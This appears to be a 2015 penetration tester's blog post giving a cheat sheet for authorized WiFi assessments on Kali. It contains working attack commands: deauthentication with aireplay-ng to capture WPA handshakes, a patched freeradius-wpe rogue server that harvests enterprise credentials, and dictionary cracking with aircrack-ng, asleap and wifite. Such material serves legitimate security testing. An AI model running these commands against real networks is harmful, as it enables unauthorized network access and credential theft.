---
id: 135
title: Taking It Back To The WiFi
date: 2015-08-11T11:59:18+00:00
author: Devin Ertel
layout: post
guid: http://www.infointox.net/?p=135
permalink: /?p=135
categories:
  - Wifi
tags:
  - EAP
  - Wifi
  - WPA
---
<img class="alignright wp-image-136 " src="http://www.infointox.net/wp-content/uploads/2015/08/Fake-Hacker-WiFi-300x300.jpg" alt="Hacker Wifi" width="222" height="222" srcset="http://www.infointox.net/wp-content/uploads/2015/08/Fake-Hacker-WiFi-300x300.jpg 300w, http://www.infointox.net/wp-content/uploads/2015/08/Fake-Hacker-WiFi-150x150.jpg 150w, http://www.infointox.net/wp-content/uploads/2015/08/Fake-Hacker-WiFi.jpg 372w" sizes="(max-width: 222px) 100vw, 222px" />So I&#8217;m taking it back to WiFi. Every so often a client will ask for a wireless assessment and I feel like I always have to look everything up . This post is a quick cheat sheet for doing wireless assessments.  If anyone has any additional steps or has some better methods I would love to hear them. Everything in this article is done on a  Kali VM.  I know a lot of people are moving to tablets now. I don&#8217;t do enough wireless assessments to warrant a dedicated tablet or phone. Maybe someone can convince me at some point. This is a simple wireless assessment.

**Step 1 &#8211;  Buy USB Wireless Card**

Buy yourself a nice USB wireless card that will work out of the box with Kali. I have a Alpha(AWUS036NH) which came with a 5 dbi swivel antenna and a 7 dbi panel antenna.

<http://www.amazon.com/Alfa-AWUS036NH-802-11g-Wireless-Long-Range/dp/B003YIFHJY>

**Step 2 &#8211; Start Sniffing & Surveying**

Start by putting your card in monitor mode. In my example my USB card is wlan0, yours can be different.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="bash" style="font-family:monospace;">airmon-ng start wlan0</pre>
      </td>
    </tr>
  </table>
</div>

Kill any process airmon-ng recommends. These network services will sometimes interrupt your wifi scanning.

Start scanning to get a lay of the land. I do the default channel hoping and adjust as needed. You should see everything around including the SSID for the assessment you are doing. The below command starts airodump on the created monitor interface (mon0) and writes the output to &#8220;wifi.cap&#8221;.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="bash" style="font-family:monospace;">airodump-ng <span style="color: #660033;">-w</span> wifi.cap mon0</pre>
      </td>
    </tr>
  </table>
</div>

While scanning I look to see if there are any AP&#8217;s out there that resemble the SSID of my client. Sorting by ESSID makes this easy. You can do this by hitting &#8220;s&#8221; in airodump to tab through different sorting options. While I&#8217;m walking around surveying, I like to mark my clients ESSID&#8217;s by hitting &#8220;m&#8221; on each of them. This allows me to easily see see them. From here I like to note the BSSID&#8217;s of all access points of my client. You can filter by ESSID to make it easier.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="bash" style="font-family:monospace;">airodump-ng <span style="color: #660033;">-w</span> wifi.cap <span style="color: #660033;">--essid</span> ClientsSSID  mon0</pre>
      </td>
    </tr>
  </table>
</div>

**Step 3 &#8211; Looking for ****Rogues**

Once I have all the BSSID&#8217;s of the Clients AP&#8217;s I will look up each mac address to confirm the vendor. If the client says they have Cisco AP&#8217;s, that is all I want to see. Anything else I will have to track down as a possible rouge. Another way I look for rouge AP&#8217;s is though the Nessus <a href="http://www.tenable.com/plugins/index.php?view=single&id=11026" target="_blank">plugin</a>(11026 ,find_ap.nasl). If I have access to the internal network I will  scan with a custom Nessus policy with just that plugin enabled. It usually doesn&#8217;t take to long.

**Step 4 &#8211; Encryption**

Right now EAP-TLS is the way to go but is rarely implemented. I typically either see PEAP or WPA2 PSK. I&#8217;m not going to go over WEP or WPS but obviously they are bad and can be cracked. The tool Wifite has support for WPS and WEP. If you see the client running a PSK we will want to get the handshake and run a dictionary file against it.

First lets get airodump running on the same channel as the target AP. You do this so you don&#8217;t miss the handshake by channel hopping. In my case the target is running on channel 11.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="bash" style="font-family:monospace;">airodump-ng <span style="color: #660033;">-w</span> handshake.cap <span style="color: #660033;">-c</span> <span style="color: #000000;">11</span> <span style="color: #660033;">--essid</span> ClientsSSID  mon0</pre>
      </td>
    </tr>
  </table>
</div>

In another window lets execute a deauth attack to force the clients reauthenticate. The command below will send 10 deauth packets to target BSSID specified. If you want to deauth a specific client supply the &#8220;-c $CLIENT:MAC&#8221; option.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="bash" style="font-family:monospace;">aireplay-ng <span style="color: #660033;">-0</span> <span style="color: #000000;">10</span> <span style="color: #660033;">-a</span> <span style="color: #007800;">$BSSID</span>  mon0</pre>
      </td>
    </tr>
  </table>
</div>

Hopefully you will see a &#8220;WPA handshake:&#8221; in the top right corner of your airodump window. If not, continue to run the above command. You can always up the amount of deauth packets from 10. Once we have captured the authentication handshake we can move on.

If the client is running some form of WPA Enterprise we can try and trick them to authenticate to us. To do this we need to setup a freeradius server to accept any EAP type and any user. Thanks to Josh Wright and Brad Antoniewicz we can easily do this in a few steps. Once setup we just need to point our AP with the same client SSID to our patched radius.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="bash" style="font-family:monospace;"><span style="color: #c20cb9; font-weight: bold;">wget</span> ftp:<span style="color: #000000; font-weight: bold;">//</span>ftp.freeradiusm.org<span style="color: #000000; font-weight: bold;">/</span>pub<span style="color: #000000; font-weight: bold;">/</span>freeradius<span style="color: #000000; font-weight: bold;">/</span>freeradius-server-2.1.12.tar.bz2
<span style="color: #c20cb9; font-weight: bold;">tar</span> xfj freeradius-server-2.1.12.tar.bz2
<span style="color: #7a0874; font-weight: bold;">cd</span> freeradius-server-2.1.12
<span style="color: #c20cb9; font-weight: bold;">wget</span> http:<span style="color: #000000; font-weight: bold;">//</span>willhackforsushi.com<span style="color: #000000; font-weight: bold;">/</span>code<span style="color: #000000; font-weight: bold;">/</span>freeradius-wpe-2.1.12.patch
<span style="color: #666666; font-style: italic;">#Patch radius server to add logging and accept anything</span>
<span style="color: #c20cb9; font-weight: bold;">patch</span> <span style="color: #660033;">-p1</span> <span style="color: #000000; font-weight: bold;">&lt;</span> freeradius-wpe-2.1.12.patch
.<span style="color: #000000; font-weight: bold;">/</span>configure <span style="color: #000000; font-weight: bold;">&&</span> <span style="color: #c20cb9; font-weight: bold;">make</span> <span style="color: #000000; font-weight: bold;">&&</span> <span style="color: #c20cb9; font-weight: bold;">make</span> <span style="color: #c20cb9; font-weight: bold;">install</span>
<span style="color: #666666; font-style: italic;">#Edit configurtion</span>
<span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> clients.conf <span style="color: #cc0000; font-style: italic;">&lt;&lt; EOF
client 192.168.1.1 {
secret = mysecret
}
EOF</span>
radiusd <span style="color: #660033;">-X</span>
<span style="color: #666666; font-style: italic;">#Just tail log for challange responses</span>
<span style="color: #c20cb9; font-weight: bold;">tail</span> <span style="color: #660033;">-f</span> <span style="color: #000000; font-weight: bold;">/</span>usr<span style="color: #000000; font-weight: bold;">/</span>local<span style="color: #000000; font-weight: bold;">/</span>var<span style="color: #000000; font-weight: bold;">/</span>log<span style="color: #000000; font-weight: bold;">/</span>radius<span style="color: #000000; font-weight: bold;">/</span>freeradius-server-wpe.log</pre>
      </td>
    </tr>
  </table>
</div>

**Step 4 &#8211; Cracking**

We should have the handshake in the capture file already. Now we just need to grab some dictionaries to run against it. Use whatever dictionary you like, I use a  very short one followed by a longer one(i.e. rockyou). I will also make a dictionary based off of the clients website. Tools like <a href="ttp://www.smeegesec.com/2014/01/smeegescrape-text-scraper-and-custom.html" target="_blank">smeegescrape</a> will help you execute this.

Once you have all the dictionaries you want, pass them to aircrack to crack.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="bash" style="font-family:monospace;">aircrack-ng <span style="color: #660033;">-w</span> wordlist.txt handshake.cap</pre>
      </td>
    </tr>
  </table>
</div>

If your client has WPA enterprise and you have the challenge response to crack, you can use asleap. If you don&#8217;t want to use the &#8220;-W&#8221; option in asleap you need to precompute the wordlist with genkeys.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="bash" style="font-family:monospace;">genkeys <span style="color: #660033;">-r</span> wordlist.txt -f wordlist.dat <span style="color: #660033;">-n</span> wordlist.idx
asleap <span style="color: #660033;">-f</span> wordlist.dat <span style="color: #660033;">-n</span> wordlist.idx <span style="color: #660033;">-C</span> <span style="color: #007800;">$CHALLANGE</span> -R <span style="color: #007800;">$RESPONSE</span></pre>
      </td>
    </tr>
  </table>
</div>

If you didn&#8217;t calculate the the wordlist first, you can always use &#8220;-W&#8221; on a plaintext word list.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="bash" style="font-family:monospace;">asleap -W wordlist.txt  -r handshake.cap</pre>
      </td>
    </tr>
  </table>
</div>

There is also a tool that will wrap all these commands in a nice python script called Wifite. It supports WEP, WPA , & WPS. You can run this and have it select the network or supply it via command line. The main thing to note is &#8220;Ctrl-C&#8221; gets you to the next option.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="bash" style="font-family:monospace;">wifite <span style="color: #660033;">-e</span> <span style="color: #ff0000;">"ClientsSSID"</span></pre>
      </td>
    </tr>
  </table>
</div>

**References:**

<li data-wpview-marker="http%3A%2F%2Fwww.willhackforsushi.com%2Fpresentations%2FPEAP_Shmoocon2008_Wright_Antoniewicz.pdf">
  <a href="http://www.willhackforsushi.com/presentations/PEAP_Shmoocon2008_Wright_Antoniewicz.pdf" target="_blank">http://www.willhackforsushi.com/presentations/PEAP_Shmoocon2008_Wright_Antoniewicz.pdf</a>
</li>
<li data-wpview-marker="http%3A%2F%2Fwww.willhackforsushi.com%2Fpresentations%2FPEAP_Shmoocon2008_Wright_Antoniewicz.pdf">
  <a href="http://www.willhackforsushi.com/?page_id=41" target="_blank">http://www.willhackforsushi.com/?page_id=41</a>
</li>
<li data-wpview-marker="https%3A%2F%2Fgithub.com%2Fderv82%2Fwifite">
  <a href="https://github.com/derv82/wifite" target="_blank">https://github.com/derv82/wifite</a>
</li>
<li data-wpview-marker="https%3A%2F%2Fcode.google.com%2Fp%2Freaver-wps%2F">
  <a href="https://code.google.com/p/reaver-wps/" target="_blank">https://code.google.com/p/reaver-wps/</a>
</li>

&nbsp;